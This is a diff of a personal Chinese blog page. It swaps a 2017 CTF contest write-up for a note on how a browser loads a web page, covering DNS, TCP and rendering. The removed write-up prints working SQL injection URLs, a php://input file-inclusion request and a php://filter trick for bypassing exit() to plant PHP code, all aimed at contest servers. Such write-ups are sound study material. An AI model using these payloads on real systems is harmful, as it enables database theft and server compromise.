@@ -6,31 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://dcison.github.io">
-  <title> &#39;“2017年华为杯网络攻防大赛&#39; | Dcison&#39;s Blog</title>
+  <title>从输入网址到页面显示 | Dcison&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="2017年11月18日南京邮电大学华为杯网络攻防大赛2泡面+1可乐+12小时=特等奖(第一名) 或许是这辈子拿到最多奖金的一次比赛了吧。特等奖2000，还有额外奖金(感谢队友)">
-<meta name="keywords" content="CTF,华为杯,校赛">
+  <meta name="description" content="看了许多网上的面试题，用自己的话来总结下这道经典面试题一些前置知识 url的组成，以https://www.baidu.com/为例 http(s) 超文本传输(安全)协议，ht 指超文本, t 指传输,p指协议,s指ssl/tls www 指子域名 baidu.com 域名 端口443（隐藏了而已，http默认80，https默认443) 最后的/后面是路径">
+<meta name="keywords" content="笔记">
 <meta property="og:type" content="article">
-<meta property="og:title" content=" &#39;“2017年华为杯网络攻防大赛&#39;">
-<meta property="og:url" content="https://dcison.github.io/2017/11/21/“2017年华为杯网络攻防大赛/index.html">
+<meta property="og:title" content="从输入网址到页面显示">
+<meta property="og:url" content="https://dcison.github.io/2018/02/27/从输入网址到页面显示/index.html">
 <meta property="og:site_name" content="Dcison&#39;s Blog">
-<meta property="og:description" content="2017年11月18日南京邮电大学华为杯网络攻防大赛2泡面+1可乐+12小时=特等奖(第一名) 或许是这辈子拿到最多奖金的一次比赛了吧。特等奖2000，还有额外奖金(感谢队友)">
+<meta property="og:description" content="看了许多网上的面试题，用自己的话来总结下这道经典面试题一些前置知识 url的组成，以https://www.baidu.com/为例 http(s) 超文本传输(安全)协议，ht 指超文本, t 指传输,p指协议,s指ssl/tls www 指子域名 baidu.com 域名 端口443（隐藏了而已，http默认80，https默认443) 最后的/后面是路径">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://wx4.sinaimg.cn/large/006m1w1Agy1flq0t6taajj30sn0biabj.jpg">
-<meta property="og:image" content="http://wx1.sinaimg.cn/large/006m1w1Agy1flq0t9kzqij30f80dr74s.jpg">
-<meta property="og:image" content="http://wx3.sinaimg.cn/large/006m1w1Agy1flq0tbz0ppj31fu0pete8.jpg">
-<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/006m1w1Agy1flq0tek7p3j30qw0kq40p.jpg">
-<meta property="og:image" content="http://wx2.sinaimg.cn/large/006m1w1Agy1flq0tgjullj30gd02s3za.jpg">
-<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/006m1w1Agy1flq0u0zbjwj31510pnwmx.jpg">
-<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/006m1w1Agy1flq0u3be7kj30mz061jro.jpg">
-<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/006m1w1Aly1flq0u5p3iaj315y035ta4.jpg">
-<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/006m1w1Aly1flq0u7fzh2j30nm0coq5e.jpg">
-<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/006m1w1Aly1flq1k013ylj310j0p3ah7.jpg">
-<meta property="og:updated_time" content="2017-11-21T14:04:13.634Z">
+<meta property="og:updated_time" content="2018-02-27T12:49:01.114Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content=" &#39;“2017年华为杯网络攻防大赛&#39;">
-<meta name="twitter:description" content="2017年11月18日南京邮电大学华为杯网络攻防大赛2泡面+1可乐+12小时=特等奖(第一名) 或许是这辈子拿到最多奖金的一次比赛了吧。特等奖2000，还有额外奖金(感谢队友)">
-<meta name="twitter:image" content="http://wx4.sinaimg.cn/large/006m1w1Agy1flq0t6taajj30sn0biabj.jpg">
+<meta name="twitter:title" content="从输入网址到页面显示">
+<meta name="twitter:description" content="看了许多网上的面试题，用自己的话来总结下这道经典面试题一些前置知识 url的组成，以https://www.baidu.com/为例 http(s) 超文本传输(安全)协议，ht 指超文本, t 指传输,p指协议,s指ssl/tls www 指子域名 baidu.com 域名 端口443（隐藏了而已，http默认80，https默认443) 最后的/后面是路径">
   
     <link rel="alternative" href="/atom.xml" title="Dcison&#39;s Blog" type="application/atom+xml">
   
@@ -172,115 +161,81 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-“2017年华为杯网络攻防大赛" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-从输入网址到页面显示" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-       &#39;“2017年华为杯网络攻防大赛&#39;
+      从输入网址到页面显示
     </h1>
   
 
         
-        <a href="/2017/11/21/“2017年华为杯网络攻防大赛/" class="archive-article-date">
-  	<time datetime="2017-11-21T12:52:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-21</time>
+        <a href="/2018/02/27/从输入网址到页面显示/" class="archive-article-date">
+  	<time datetime="2018-02-27T11:23:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="2017年11月18日南京邮电大学华为杯网络攻防大赛"><a href="#2017年11月18日南京邮电大学华为杯网络攻防大赛" class="headerlink" title="2017年11月18日南京邮电大学华为杯网络攻防大赛"></a>2017年11月18日南京邮电大学华为杯网络攻防大赛</h1><p>2泡面+1可乐+12小时=特等奖(第一名)</p>
-<p>或许是这辈子拿到最多奖金的一次比赛了吧。特等奖2000，还有额外奖金(感谢队友)<br><a id="more"></a><br><strong>以下说的完成是指主要完成,不仅仅是个人功劳,团队合作是很重要滴。</strong></p>
-<h2 id="我完成的题目"><a href="#我完成的题目" class="headerlink" title="我完成的题目"></a>我完成的题目</h2><ul>
-<li>SQL初战</li>
-<li>签到二</li>
-<li>彭泽家族天下第一</li>
-<li>逆向签到</li>
-<li>Easy WireShark</li>
-<li>大神的求救1</li>
-<li>梅子酒要充水卡</li>
-<li>混合编码</li>
-<li>php (未在比赛中完成,也有额外奖金)<h2 id="队友完成的题目"><a href="#队友完成的题目" class="headerlink" title="队友完成的题目"></a>队友完成的题目</h2></li>
-<li>签到</li>
-<li>Ajax</li>
-<li>BabyRE</li>
-<li>Single(有额外奖金)</li>
-<li>BabyRsA</li>
-<li>Alice&amp;Bob Revenge</li>
-<li>Just PY</li>
-</ul>
-<h3 id="放出write-up-纪念下-留一个笔记"><a href="#放出write-up-纪念下-留一个笔记" class="headerlink" title="放出write_up 纪念下(留一个笔记)"></a>放出write_up 纪念下(留一个笔记)</h3><p><strong>仅放出我完成的题目的write_up吗,其他的可以看我队友的<a href="https://mzi.red/2017/11/19/nyctf2017/#more" target="_blank" rel="external">blog</a></strong></p>
-<ol>
-<li><p>SQL初战</p>
-<p>宽字节注入,与原来平台上的思路一样,可参考我以前的<a href="http://m.blog.csdn.net/dcison/article/details/53125540" target="_blank" rel="external">blog</a> 的sql injection 3<br>这里直接放playload了</p>
-<p><a href="https://ctf11.nuptsast.com/index.php?id=%df" target="_blank" rel="external">https://ctf11.nuptsast.com/index.php?id=%df</a>‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23<br>得到表名 flag</p>
-<p><a href="https://ctf11.nuptsast.com/index.php?id=%df" target="_blank" rel="external">https://ctf11.nuptsast.com/index.php?id=%df</a>‘ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666C6167 %23<br>得到字段名flag</p>
-<p>拿flag:<a href="https://ctf11.nuptsast.com/index.php?id=%df" target="_blank" rel="external">https://ctf11.nuptsast.com/index.php?id=%df</a>‘ union select 1,group_concat(flag) from flag %23</p>
-<p>flag{NJUPT_Sql_1nj3ction_ch4ll_c0mpl3t3!}</p>
-</li>
-<li><p>签到2</p>
-<p>访问hint.txt得到提示文件读取<br>构建playload</p>
-<p><img src="http://wx4.sinaimg.cn/large/006m1w1Agy1flq0t6taajj30sn0biabj.jpg"></p>
-<p>对其base64解码得到flag</p>
-<p><img src="http://wx1.sinaimg.cn/large/006m1w1Agy1flq0t9kzqij30f80dr74s.jpg"></p>
-</li>
-<li><p>彭泽家族天下第一<br>根据以前做的原题改cookie中的login=1,可得到源码</p>
-<p><img src="http://wx3.sinaimg.cn/large/006m1w1Agy1flq0tbz0ppj31fu0pete8.jpg"></p>
-<p>发现是做过的原题,直接上playload:</p>
-<p><a href="https://ctf7.nuptsast.com/index.php?user=php://input&amp;file=39adfa359d047dc2d867e3f706b2aae2" target="_blank" rel="external">https://ctf7.nuptsast.com/index.php?user=php://input&amp;file=39adfa359d047dc2d867e3f706b2aae2</a></p>
-<p>同时post 数据: IM PengZeFan!(由于比赛采用了https平台,我burp未配置证书,只能让队友发送playload了,所以说队友是很重要滴)</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006m1w1Agy1flq0tek7p3j30qw0kq40p.jpg"></p>
-</li>
-<li><p>逆向签到</p>
-<p>没啥技术含量,直接winhex等软件打开搜索flag就得到了</p>
-<p><img src="http://wx2.sinaimg.cn/large/006m1w1Agy1flq0tgjullj30gd02s3za.jpg"></p>
-</li>
-<li><p>Easy WireShark</p>
-<p>比赛的时候超幸运一下就找到了,赛后写write_up找了超久。。。</p>
-<p><img src="http://wx3.sinaimg.cn/mw690/006m1w1Agy1flq0u0zbjwj31510pnwmx.jpg"></p>
-</li>
-<li><p>大神的求救1<br>题目：0x11-32 0x16-34123 0x0-23 0x7-33 0x146-4311提示是摩斯密码</p>
-<p>对’-‘前的数字转2进制</p>
-<p>得到10001 10110 0 111 101000110</p>
-<p>‘-‘后面的数字是分段</p>
-<p>分别分段</p>
-<ol>
-<li>100 11（3 2）</li>
-<li>10110（34123）34123一共13位，位数不足补0 所以是 000 0000 0 10 110</li>
-<li>0 （23） 00 000</li>
-<li>111 （33）000 111</li>
-<li>101000110 （4311）1010 001 1 0</li>
+        <h2 id="看了许多网上的面试题，用自己的话来总结下这道经典面试题"><a href="#看了许多网上的面试题，用自己的话来总结下这道经典面试题" class="headerlink" title="看了许多网上的面试题，用自己的话来总结下这道经典面试题"></a>看了许多网上的面试题，用自己的话来总结下这道经典面试题</h2><h3 id="一些前置知识"><a href="#一些前置知识" class="headerlink" title="一些前置知识"></a>一些前置知识</h3><ol>
+<li>url的组成，以<a href="https://www.baidu.com/为例" target="_blank" rel="external">https://www.baidu.com/为例</a><ol>
+<li>http(s) 超文本传输(安全)协议，ht 指超文本, t 指传输,p指协议,s指<a href="https://baike.baidu.com/item/ssl/320778?fr=aladdin" target="_blank" rel="external">ssl</a>/<a href="https://baike.baidu.com/item/TLS" target="_blank" rel="external">tls</a></li>
+<li>www 指子域名</li>
+<li>baidu.com 域名</li>
+<li>端口443（隐藏了而已，http默认80，https默认443)</li>
+<li>最后的/后面是路径</li>
 </ol>
-<p>连接字符串100 01 000 0000 0 10 110 00 000 000 111 1010 001 1 0<br>用’-‘替换1,’.’替换0,得到:</p>
-<p>-.. .- … …. . -. –. .. … … — -.-. ..- - .</p>
-<p>在线解密就行了</p>
-<p><img src="http://wx3.sinaimg.cn/mw690/006m1w1Agy1flq0u3be7kj30mz061jro.jpg"></p>
-</li>
-<li><p>梅子酒要充水卡</p>
-<p>给了两个文件,文件名分别是36 48 其实是代表金额数<br>题目要说充100 RMB ,对两个文件逐行分析(左边那个是已经改好的,已经代表100RMB,原来是36RMB)</p>
-<p><img src="http://wx4.sinaimg.cn/mw690/006m1w1Aly1flq0u5p3iaj315y035ta4.jpg"></p>
-<p>36的16进制是24，48的16进制是30,所以6400是100RMB而3000+CFFF = FFFF ，所以用FFFF-6400得9BFF</p>
-<p>所以Flag就是 64 9B(flag是数据段+校验段)</p>
-</li>
-<li><p>混合编码</p>
-<p>同样是南邮ctf平台上原题(base全家桶)</p>
-<p>直接上以前人家写好的代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line">steps = []</div><div class="line">f = open (<span class="string">'code.txt'</span>,<span class="string">'rb'</span>)</div><div class="line">p = f.read()</div><div class="line">n = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="comment"># Base16</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> (<span class="string">"[?] using base16 deocde"</span>)</div><div class="line">        n = base64.b16decode(p)</div><div class="line">        <span class="keyword">print</span> (<span class="string">"[+] %s"</span> % (n))</div><div class="line">        steps.append(<span class="number">16</span>)</div><div class="line">        p = n</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="comment"># Base32</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> (<span class="string">"[?] using base32 deocde"</span>)</div><div class="line">        n = base64.b32decode(p)</div><div class="line">        <span class="keyword">print</span> (<span class="string">"[+] %s"</span> % (n))</div><div class="line">        steps.append(<span class="number">32</span>)</div><div class="line">        p = n</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="comment"># Base64</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> (<span class="string">"[?] using base64 deocde"</span>)</div><div class="line">        n = base64.b64decode(p)</div><div class="line">        <span class="keyword">print</span> (<span class="string">"[+] %s"</span> % (n))</div><div class="line">        steps.append(<span class="number">64</span>)</div><div class="line">        p = n</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> (<span class="string">"[+] flag found : %s"</span> % (n))</div><div class="line"><span class="keyword">print</span> (<span class="string">"[+] steps : %s"</span> % (steps))</div></pre></td></tr></table></figure>
 </li>
 </ol>
-<p>   (借用了队友电脑跑的结果)</p>
-<p>  <img src="http://wx4.sinaimg.cn/mw690/006m1w1Aly1flq0u7fzh2j30nm0coq5e.jpg"></p>
+<a id="more"></a>
 <ol>
-<li><p>php (与额外奖金错过了,心痛)</p>
-<p>关键是如何<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="external">绕过exit</a></p>
-<p>关键是这句话:</p>
-<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。</p>
-<p>这题中访问其根目录得到的提示存在一个flagggggg.php文件。所以构建b=a+php语句的base64编码(我写的是&lt;?php show_source(‘flagggggg.php’) ?&gt;)</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006m1w1Aly1flq1k013ylj310j0p3ah7.jpg"></p>
+<li>DNS <ol>
+<li>基于UDP协议的网络协议。专门用于服务器和IP地址的查询。是域名和<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80" target="_blank" rel="external">IP地址</a>相互映射的一个<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" rel="external">分布式数据库</a>，能够使用户更方便的访问<a href="https://baike.baidu.com/item/%E4%BA%92%E8%81%94%E7%BD%91" target="_blank" rel="external">互联网</a>，而不用去记住能够被机器直接读取的IP数串。</li>
+</ol>
 </li>
+<li>TCP协议<ol>
+<li>3次握手：①客户端：你好，在吗 ②服务器端：我在 ③客户端：那开始聊天吧</li>
+<li>4次挥手： ①客户端：我们分手吧 ②服务器端：哦（表示服务器端知道要分手的消息了） ③分吧 （表示服务器端正式开始分开）④客户端：再见！</li>
+</ol>
+</li>
+</ol>
+<h1 id="开始说明"><a href="#开始说明" class="headerlink" title="开始说明"></a>开始说明</h1><hr>
+<ol>
+<li>输入网址（<a href="https://www.baidu.com" target="_blank" rel="external">https://www.baidu.com</a>)</li>
+<li>域名不是ip，走dns协议</li>
+<li>浏览器把域名发送给<b>系统默认DNS服务器</b></li>
+<li>如果该服务器本地有缓存，且缓存未过期就返回改结果</li>
+<li>如果没找到，dns服务器就会向上一级的dns服务器继续查找，直至最上层dns服务器</li>
+<li>找到了返回结果（ipv4/ipv6/alias(别名)），找不到就会返回dns错误</li>
+<li>浏览器通过TCP协议发起网络请求</li>
+<li>请求结束后发起TCP4次挥手</li>
+</ol>
+<hr>
+<ol>
+<li>在如果有结果的情况下，浏览器发起网络请求，服务器会返回一个响应包</li>
+<li>如果响应状态码是301、 302发生重定向的话，就重复上面过程</li>
+</ol>
+<hr>
+<ol>
+<li>如果状态码是200时，服务器发回一个HTML响应，浏览器开始显示HTML</li>
+<li>浏览器渲染引擎开始渲染HTML</li>
+<li>构建DOM树</li>
+<li>构建CSS树</li>
+<li>构建Render树</li>
+<li>布局Render树</li>
+<li>绘制Render树</li>
+</ol>
+<p>上述过程是逐步完成的的，渲染引擎将会尽可能早的将内容呈现到屏幕上，所以并不会等到所有的html都解析完成之后再去构建和布局render树。</p>
+<p>因此我们常把CSS放body前，JavaScript放body的最后，还有重绘、回流等等问题不是主题相关重点，就不说了。</p>
+<hr>
+<p>参考资料：</p>
+<ol>
+<li><a href="https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions/Questions-and-Answers" target="_blank" rel="external">前端面试宝典</a></li>
+<li>前置知识的所有网站</li>
 </ol>
 
       
@@ -295,15 +250,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">华为杯</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">校赛</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
         		</li>
       		
 		</ul>
@@ -315,7 +262,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/随笔/" class="article-tag-list-link color3">随笔</a>
+        			<a href="/categories/笔记/" class="article-tag-list-link color3">笔记</a>
         		</li>
       		
 		</ul>
@@ -370,7 +317,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://dcison.github.io/2017/11/21/“2017年华为杯网络攻防大赛/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://dcison.github.io/2018/02/27/从输入网址到页面显示/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -385,8 +332,8 @@
 <nav id="article-nav">
   
   
-    <a href="/2017/09/12/js常用代码/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">js常用代码</div>
+    <a href="/2018/02/09/永远的七日之都静态模拟/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">永远的七日之都静态模拟</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -447,7 +394,7 @@ gitment.render('box')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2017 Dcison
+    		&copy; 2018 Dcison
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -550,6 +497,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">华为杯</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">校赛</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">琐事</a>
               </li>
              
@@ -578,18 +537,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">华为杯</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">校赛</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">css</a>
               </li>
              
@@ -599,6 +546,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">面试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">永远的七日之都在线模拟</a>
               </li>
              
               <li class="article-tag-list-item">
